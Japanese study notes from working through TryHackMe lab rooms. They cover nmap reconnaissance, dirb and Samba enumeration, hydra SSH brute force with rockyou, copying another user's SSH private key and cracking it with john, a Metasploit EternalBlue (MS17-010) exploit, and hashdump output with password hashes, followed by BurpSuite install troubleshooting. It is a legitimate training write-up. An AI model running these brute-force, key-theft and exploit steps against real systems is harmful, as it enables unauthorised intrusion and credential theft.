# 7日間でハッキングを始める本まとめ
[TryHackMe](https://tryhackme.com/)というHackingの練習をできるサイトを利用してHackingについて学ぶ。
環境にはHackingツールが揃っているKali Linuxを利用していくので仮想環境を準備する。

## Day1:環境準備
- [TryHackMe](https://tryhackme.com/)のアカウント作成
- mac環境でのkali Linuxの仮想環境構築はこちらのサイトがわかりやすい：[macでのkaliのインストール](https://qiita.com/matz1ppei/items/def3b0b81b8b97c0e447)
- mac環境のKali Linuxの各種設定はこちらのサイトがわかりやすい：[Kali Linux on UTMの最小設定](https://qiita.com/matz1ppei/items/26396a71e3bfd80abc49)
- Hint: macの場合、UTMの設定画面は仮想環境をシャットダウンしてから「編集」が選べるようになる
- Hint: 共有フォルダはUTMの設定から「共有」を選択してMac側のフォルダを選択

できていないこと
- googleChromeのインストール
- FireFoxのTWPのインストール

### Day1勉強したこと
- Kali linuxというHackingツールが揃ったOSがある
- VMとしてUTMを利用すると簡単に環境を構築できる
- TryHackMeからファイルDLしてVPN接続する
- ハッキング練習を他のサイトに実施しないようにVPNは必須

## Day2：ターゲットの偵察と辞書攻撃
[Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)  
開発中のサイトに攻撃をしてみる。最初はどのような通信が許可されているかをnmapで調査。

### ポート調査
このコマンドでは、ターゲットがping応答しない環境下でも強制的にポートスキャンを行い、さらに各ポートで稼働しているサービスのバージョンまで取得します。結果は nmap.txt に保存されるので、後で分析しやすくなります。
```
nmap -sV -Pn -oN nmap.txt -v 10.xx.x.x
```

|オプション|説明|
|:----|:----|
|-sV|サービスのバージョン検出を行う。各ポートで動作しているアプリケーションの種類とバージョンを推測します。|
|-Pn|ホストのpingスキャンをスキップし、ホストがオンラインであると仮定してスキャンします。ファイアウォールでICMPがブロックされているときに便利です。|
|-oN nmap.txt|スキャン結果を通常の（人間が読みやすい）形式で nmap.txt に保存します。|
|-v|詳細モード。進捗や追加情報を表示します（複数回指定することでさらに詳細になる）。|
|10.xx.x.x|スキャン対象のIPアドレスです（マスキングされていますが、実際のターゲットIPを指定します）。|

結果は以下でSSHやHTTP・Sambaのポートが解放されている。
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

httpでマシンにアクセスすると、開発中のページ表示がされる。
追加情報はないがアクセスできるページがないかを調査する

### サイトへの攻撃
■dirbを利用した辞書攻撃  
dirbコマンドを利用すると、辞書ファイルのパスを利用してアクセスできる階層がないかを調査できる  
以下のコマンドではsmall.txt内の辞書を利用して、"http:///10.x.x.x"配下にアクセスできるディレクトリがないか調査する
```
dirb http://10.x.x.x /usr/share/dirb/wordlists/small.txt
```
結果としてdevelopmentのパスがあることが確認できる。
developmentにあるテキストから、JとKが開発者でKのパスワードが脆弱性があることがわかる

### Sambaへの攻撃
SambaはWindowsのファイル共有やプリンタ共有をLinuxでも利用できるようにするためのソフトウェア。
匿名でのアクセスが可能であるため、なにか情報が共有フォルダに置かれていかなどを調べる。

enum4linux は Samba や Windows系の共有サービスの情報を一気に引き出せるツール
```
enum4linux -a 10.x.x.x
```
以下の情報などが引き出せる

|出力項目|内容|攻略での使い道|
|:----|:----|:----|
|NetBIOS名|ホスト名やドメイン名|対象ホストの識別|
|ユーザー名リスト|ローカルユーザー名一覧|ブルートフォースやパスワード推測に利用|
|共有リスト（Shares）|公開されているファイル共有の一覧|匿名アクセス or 重要ファイルの発見|
|パスワードポリシー|ログオン制限など|クラッキングの難易度を判断|
|SID・RID|セキュリティ識別子|特定ユーザーを特定するために使用|

結果から、Anonymous(匿名ユーザー)へのアクセスが許可されていることを確認する。
ちなみに、smbclientコマンドで情報を一覧表示してもAnonymousが許可されていることはわかる
```
smbclient -L 10.x.x.x
```

Anonymousユーザーとして、ログインしてファイルを取得して、JanとKeyがユーザーであることを特定する。
```
smbclient ////10.x.x.x//Anonymous
```

![](../img/Book/7DayHacking/7DayHacking_day2_1.png)


### 辞書攻撃でsshアクセスする
rockyou.txtというパスワードクラックで有名な辞書を利用してみる。kali Linuxには最初からrockyou.txtは保管されている。
rockyouは1500万ものパスワードが保管されている。

hydraコマンドを利用すると、ユーザーを固定して、パスワード攻撃をすることができる。
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh:10.x.x.x -t 4
```

|オプション|説明|
|:----|:----|
|-l jan|ユーザー名「jan」を指定（単一ユーザー）|
|-P /usr/share/wordlists/rockyou.txt|パスワードリストに rockyou.txt を使用|
|ssh://10.x.x.x|対象サービスは SSH（IPはマスクされています）|
|-t 4|並列で4スレッド使用（負荷を分散、スピードアップ）|

結果として、janのパスワードが辞書とマッチするので表示されるため、janとしてsshが可能となる。

![](../img/Book/7DayHacking/7DayHacking_day2_2.png)

### 横展開
janについては、アカウントを侵害できたので、kayについても侵害したい。これを横展開や水平展開とよぶ。
または、より権限が強いアカウントに対して攻撃できる場合は権限昇格ということもある。

ssh先でファイルを見ていると秘密鍵を発見。/home/kay/.ssh/rd_rsa

以下のSCPコマンドでローカルにrd_rsaをDLしたら、これを解析していく
```
scp jan@10.x.x.x:/home/kay/.ssh/id_rsa ./id_rsa
```

SSH秘密鍵が得られたが、パスフレーズで保護されておりそのままではログインできなかった。
ssh2john を使って鍵を John the Ripper 形式に変換し、rockyou.txt でクラックを実施
```
ssh2john kay_rsa > kay_hash.txt
john kay_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```


### 参考サイト
- 同じRoomを完了させている人：[TryHackMeでハッキングを勉強してみた話](https://zenn.dev/ci/articles/aa15d88b06bbed#%E5%8F%82%E8%80%83%E3%81%AB%E3%81%95%E3%81%9B%E3%81%A6%E3%81%84%E3%81%9F%E3%81%A0%E3%81%84%E3%81%9F%E6%83%85%E5%A0%B1%E7%BE%A4)
- 同じRoomを完了させている人：[【TryHackMe】Basic Pentesting：Walkthrough](https://qiita.com/kk0128/items/bbbdaa5d5982135f9b5a)

### Day2勉強したこと
- nmapで利用しているポートを洗い出せる
- dirbでサーバーのディレクトリ攻撃ができる
- SambdaはLinux用の共通フォルダサービス
- Sambdaにアノニマスユーザーが残っていると攻撃されうる
- hydraでパスワードのブルーフォース攻撃ができる
- sshでログインできればscpとかでファイルをローカルに保存できる

## Day3：Windowsの脆弱性を利用した攻撃
[Blue](https://tryhackme.com/room/blue)  
Windowsサーバーに対してまずはnmapで偵察

### ネットワークの偵察
```
nmap -sV -Pn -oN nmap.txt -v 10.x.x.x --script vuln
```
"--script vuln"によって、脆弱性の調査までしてくれる。

VULNERABLE(脆弱性)の結果として、"CVE-2017-0143"が出力され、リモートからの不正コード実行のRCE(Remote Code Execution)の脆弱性があることを確認できる。
```
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

### 脆弱性の調査
CVEは"Common Vulnerabilities and Exposures"という脆弱性の識別子である。
CVE-2017-0143で検索すると、どのような脆弱性かを確認できる。

CVE-2017-0143はSambdaなどで利用されるSMB(Server Message Block)と呼ばれる、ファイル共有に利用するプロトコルの旧バージョンの脆弱性。
SMBに対して、特別なコードを実行することで任意のコードをOS上で実行することが可能になる。

2017年、世界中で猛威をふるったサイバー攻撃の1つが「EternalBlue（エターナルブルー）」を悪用した**WannaCry（ワナクライ）**による感染でした。この攻撃は、Windowsの脆弱性を突いてPCを乗っ取り、ファイルを暗号化して金銭（ビットコイン）を要求するというものでした。


### 脆弱性への攻撃
Kali Linuxには、Metasploit Frameworkというツールが準備されており、脆弱性への攻撃をすることができる。

mfsconsoleを呼び出し、脆弱性を指定して攻撃をすることができる。
以下の一連の流れに沿ってコマンドを実行すだけで脆弱性に対して攻撃し、RCEが成功する。
```sh
# mfsconsoleの実行
msfconsole
# 脆弱性の調査(利用可能なモジュールが表示される)
search CVE-2017-0143
# 利用するモジュール指定
use 0
# オプション指定
show options
# オプション指定
set XXX
# 攻撃
exploit
```

Windowsにアクセスできたので、Flagを獲得する
```
search -f flag*
```

### レインボーテーブルでハッシュからパスワードを解析
脆弱性から管理者権限まで取得できたが、ユーザーのログイン情報まで取得してみる。

Windowsのアカウント情報を以下で吐き出す。
```sh
$ hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
JonというユーザーとHashされたパスワード(ffb43xxxx)が出力される。

ハッシュは本来は元のパスワードを調べることはできないが、レインボーテーブルというパスワードとそのパスワードをハッシュ化したテーブルがあれば、ハッシュからパスワードを調査することができる。

今回は[Free Password Hash Cracker](https://crackstation.net/)というサイトを利用してHashからクラックしてみる。

![](../img/Book/7DayHacking/7DayHacking_day3_1.png)

最後にWindowsにリモートデスクトップでJonとしてログインしてみる。

### Day3勉強したこと
- nmapで脆弱性まで一緒に調査できる
- CVEで脆弱性はナンバリングされ管理されている
- MetaSploite Frameworkを利用して簡単に脆弱性をついた攻撃ができる
- パスワードが簡単なものだと、hashが流出してしまうとhashからパスワードが逆算されてしまう

## Day4：Webサイトへの攻撃
[OWASP ジュースショップ](https://tryhackme.com/room/owaspjuiceshop)  
OWASP(Open Worldwide Application Security Project)で提供されている、重要なWebアプリケーションの脆弱性を多く含んだ有名サイトに攻撃してみる。

### BurpSuiteのインストール
本では、BurpSuiteはデフォルトでログインされているとのことだったが、Kaliにインストールされていないのでインストールする。インストールにもかなり手間取るので、以下履歴。

aptでインストールを試みるがエラー
```sh
└─$ sudo apt -y install burpsuite                                  
[sudo] kali のパスワード:
パッケージリストを読み込んでいます... 完了
依存関係ツリーを作成しています... 完了        
状態情報を読み取っています... 完了        
以下の追加パッケージがインストールされます:
  java-wrappers
以下のパッケージが新たにインストールされます:
  burpsuite java-wrappers
アップグレード: 0 個、新規インストール: 2 個、削除: 0 個、保留: 833 個。
251 MB のアーカイブを取得する必要があります。
この操作後に追加で 262 MB のディスク容量が消費されます。
エラー:1 http://kali.download/kali kali-rolling/main arm64 java-wrappers all 0.4
  404  Not Found [IP: 104.17.253.239 80]
エラー:2 http://kali.download/kali kali-rolling/main arm64 burpsuite arm64 2023.10.1.2-0kali1
  404  Not Found [IP: 104.17.253.239 80]
E: http://kali.download/kali/pool/main/j/java-wrappers/java-wrappers_0.4_all.deb の取得に失敗しました  404  Not Found [IP: 104.17.253.239 80]
E: http://kali.download/kali/pool/main/b/burpsuite/burpsuite_2023.10.1.2-0kali1_arm64.deb の取得に失敗しました  404  Not Found [IP: 104.17.253.239 80]
E: いくつかのアーカイブを取得できません。apt-get update を実行するか --fix-missing オプションを付けて試してみてください。
```

apt-updateでもエラーが出る。
```sh
└─$ sudo apt update           
取得:1 http://kali.download/kali kali-rolling InRelease [41.5 kB]
エラー:1 http://kali.download/kali kali-rolling InRelease
  以下の署名が無効です: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository <devel@kali.org>
41.5 kB を 1秒 で取得しました (59.4 kB/s)
パッケージリストを読み込んでいます... 完了
依存関係ツリーを作成しています... 完了
状態情報を読み取っています... 完了        
アップグレードできるパッケージが 833 個あります。表示するには 'apt list --upgradable' を実行してください。
W: 署名照合中にエラーが発生しました。リポジトリは更新されず、過去のインデックスファイルが使われます。GPG エラー: http://kali.download/kali kali-rolling InRelease: 以下の署名が無効です: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository <devel@kali.org>
W: http://http.kali.org/kali/dists/kali-rolling/InRelease の取得に失敗しました  以下の署名が無効です: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository <devel@kali.org>
W: いくつかのインデックスファイルのダウンロードに失敗しました。これらは無視されるか、古いものが代わりに使われます。
```
Kaliのリポジトリを信用するための「署名鍵」が古くなって、リポジトリの最新かができないので、署名鍵のアップデートを行う。
```sh
# 古いキーの削除
sudo apt-key del ED444FF07D8D0BF6

# 新しい鍵の取得
curl -fsSL https://archive.kali.org/archive-key.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/kali-archive-keyring.gpg

# リポジトリの更新
sudo apt update
```

これでkaliにBurpSuiteのインストールができる
```
sudo apt install burpsuite
```

しかし、burpsuiteの実行をするとエラーが出る。javaのバージョンがあっていないのが原因。Java21をインストールする必要がありそう。
```sh
└─$ burpsuite
[warning] /usr/bin/burpsuite: No JAVA_CMD set for run_java, falling back to JAVA_CMD = java
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
エラー: メイン・クラスburp.StartBurpのロード中にLinkageErrorが発生しました
        java.lang.UnsupportedClassVersionError: burp/StartBurp has been compiled by a more recent version of the Java Runtime (class file version 65.0), this version of the Java Runtime only recognizes class file versions up to 61.0
```

kali側のJavaと不整合を起こすため、Java 21のインストール時にパッケージの依存関係エラー。
aptはシステム全体の整合性をチェックしてくれるので、Kaliなどのバージョン管理が複雑なOSだと拒否される可能性がある。
```sh
└─$ sudo apt install openjdk-21-jdk
パッケージリストを読み込んでいます... 完了
依存関係ツリーを作成しています... 完了        
状態情報を読み取っています... 完了        
インストールすることができないパッケージがありました。おそらく、あり得
ない状況を要求したか、(不安定版ディストリビューションを使用しているの
であれば) 必要なパッケージがまだ作成されていなかったり Incoming から移
動されていないことが考えられます。
以下の情報がこの問題を解決するために役立つかもしれません:

以下のパッケージには満たせない依存関係があります:
 kali-desktop-xfce : 依存: kali-desktop-core しかし、インストールされようとしていません
E: エラー、pkgProblemResolver::Resolve は停止しました。おそらく変更禁止パッケージが原因です。
```

Javaアプリを動かすだけなら JDK ではなく JRE（ランタイム環境）で十分なことが多いのでこちらにチャレンジするがエラー。やっぱりダメみたい。
```sh
└─$ sudo apt install openjdk-21-jre 
パッケージリストを読み込んでいます... 完了
依存関係ツリーを作成しています... 完了        
状態情報を読み取っています... 完了        
インストールすることができないパッケージがありました。おそらく、あり得
ない状況を要求したか、(不安定版ディストリビューションを使用しているの
であれば) 必要なパッケージがまだ作成されていなかったり Incoming から移
動されていないことが考えられます。
以下の情報がこの問題を解決するために役立つかもしれません:

以下のパッケージには満たせない依存関係があります:
 kali-desktop-xfce : 依存: kali-desktop-core しかし、インストールされようとしていません
E: エラー、pkgProblemResolver::Resolve は停止しました。おそらく変更禁止パッケージが原因です。
```

avaを簡単に切り替え・管理できるツールのSDKMANでJava 21をインストールすることに挑戦。
これなら、システム全体ではなく、ユーザーごとにJava環境を作ることになるので、aptのように依存関係が出ないはず。
```sh 
# SDKMANのインストール
curl -s "https://get.sdkman.io" | bash
source "$HOME/.sdkman/bin/sdkman-init.sh"
# Java 21のインストール
sdk install java 21.0.2-open
# 利用バージョン確認
sdk use java 21.0.2-open
# バージョン確認
java -version                                                
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
openjdk version "21.0.2" 2024-01-16
OpenJDK Runtime Environment (build 21.0.2+13-58)
OpenJDK 64-Bit Server VM (build 21.0.2+13-58, mixed mode, sharing)
```
起動成功！
![](../img/Book/7DayHacking/7DayHacking_day4_1.png)

しかし、よく見てみると、Javaコマンドのパスがうまく通っていないので、利用していくとエラーが発生したので修正。
```sh
└─$ burpsuite
[warning] /usr/bin/burpsuite: No JAVA_CMD set for run_java, falling back to J
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

Javaのパスを通す
```sh
export JAVA_HOME="$HOME/.sdkman/candidates/java/21.0.2-open"
export PATH="$JAVA_HOME/bin:$PATH"

echo $JAVA_HOME
java -version
```

このjavaを指定して、burpsuiteを実行
```sh
JAVA_CMD="$JAVA_HOME/bin/java" burpsuite
```

これでもエラーが発生。ChromiumベースのGUIコンポーネントを使っており、Kali最小構成だと必要なライブラリが不足して起動できないケースが非常に多いとのことで以下をインストール
```sh
sudo apt install libgtk-3-0 libx11-xcb1 libasound2 libnss3 libxss1 libxtst6 libatk-bridge2.0-0 libxrandr2 libgbm1
```

これでもダメで以下のサイトで試したことをやってみたがダメ。。。一度整理して再実行予定
- [書籍「7日間でハッキングをはじめる本」をM1Macで完遂できるようにしたこと](https://qiita.com/yama53san/items/dc96912ff565143c51ed)



### BurpSuite解説
BurpSuiteは、ローカルプロキシツールであり、ブラウザとターゲットサーバーの間の通信に割り込む。
BurpSuiteを利用することで、通信を書き換えたりすることができる。
これによって、リクエストの形跡の分析やリクエストを書き換えて攻撃したりすることができる。

![](../img/Book/7DayHacking/7DayHacking_day4_2.jpg)
[Webアプリケーションセキュリティの検証のためのローカルプロキシツール（Burp Suite）の利用](https://www.anet.co.jp/security/engineer_blog/webburp_suite.html)


### Day4勉強したこと
## Day5
### Day5勉強したこと
## Day6
### Day6勉強したこと
## Day7
### Day7勉強したこと
